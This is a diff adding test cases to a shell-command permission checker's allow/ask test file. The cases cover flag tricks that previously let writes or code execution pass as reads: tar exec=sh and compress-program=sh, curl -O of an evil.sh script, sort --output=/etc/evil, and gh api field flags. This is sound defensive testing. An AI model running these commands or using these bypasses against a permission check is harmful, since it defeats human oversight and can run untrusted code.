@@ -90,6 +90,23 @@ reason_contains = "ok"
 command = "find . -name '*.rs' -exec wc -l {} ;"
 decision = "allow"
 
+# #160: -fprint*/-fls write to an arbitrary path arg, not just search.
+[[case]]
+command = "find . -fprintf /tmp/evil %p"
+decision = "ask"
+
+[[case]]
+command = "find . -fls /tmp/evil"
+decision = "ask"
+
+[[case]]
+command = "find . -fprint /tmp/evil"
+decision = "ask"
+
+[[case]]
+command = "find . -name foo.txt"
+decision = "allow"
+
 # ---- fd ----
 [[case]]
 command = "fd -e rs"
@@ -142,6 +159,12 @@ decision = "ask"
 command = "ip link show"
 decision = "allow"
 
+# #160: -f/-family takes a value; without skipping it, "addr"/"add" shift
+# and the mutation slips past as a read.
+[[case]]
+command = "ip -f inet addr add 1.2.3.4/24 dev eth0"
+decision = "ask"
+
 [[case]]
 command = "ifconfig"
 decision = "allow"
@@ -165,6 +188,34 @@ decision = "allow"
 
 [[case]]
 command = "tar -x archive.tar"
+decision = "ask"
+
+# #160: program-exec flags spawn an external command even alongside -t/--list.
+[[case]]
+command = "tar -t -f a.tar --use-compress-program=sh"
+decision = "ask"
+
+[[case]]
+command = "tar --list --checkpoint=1 --checkpoint-action=exec=sh -f a.tar"
+decision = "ask"
+
+# ---- sort ----
+[[case]]
+command = "sort input"
+decision = "allow"
+
+[[case]]
+command = "sort -o /tmp/x input"
+decision = "allow"
+
+# #160: attached `-oPATH` (no space) previously bypassed the `-o` guard.
+[[case]]
+command = "sort -oout.txt input"
+decision = "ask"
+
+# #160: `--output=` equals-form previously bypassed the `-o`-only guard.
+[[case]]
+command = "sort --output=/etc/evil input"
 decision = "ask"
 
 [[case]]
@@ -234,6 +285,24 @@ decision = "ask"
 command = "curl --help"
 decision = "allow"
 
+[[case]]
+command = "curl https://api.example.com"
+decision = "allow"
+
+# #160: the filename is server-controlled with these flags, so we can't emit
+# a redirect target — fail closed rather than the previous blanket GET Allow.
+[[case]]
+command = "curl -O https://a.example/evil.sh"
+decision = "ask"
+
+[[case]]
+command = "curl --remote-name-all https://a.example/evil.sh"
+decision = "ask"
+
+[[case]]
+command = "curl -J https://a.example/evil.sh"
+decision = "ask"
+
 # ---- gh ----
 [[case]]
 command = "gh pr view 123"
@@ -258,6 +327,21 @@ decision = "ask"
 [[case]]
 command = "gh --help"
 decision = "allow"
+
+[[case]]
+command = "gh api repos/owner/repo"
+decision = "allow"
+
+# #160: `-f`/`-F` field flags silently switch a REST call to POST even
+# without -X, so any field flag on a non-graphql endpoint must Ask.
+[[case]]
+command = "gh api repos/o/r/issues -f title=hi"
+decision = "ask"
+
+# #160: `-F` was missing from the GraphQL mutation-detection loop.
+[[case]]
+command = "gh api graphql -F query=mutationAddStar"
+decision = "ask"
 
 [[case]]
 command = "gh issue view 42"
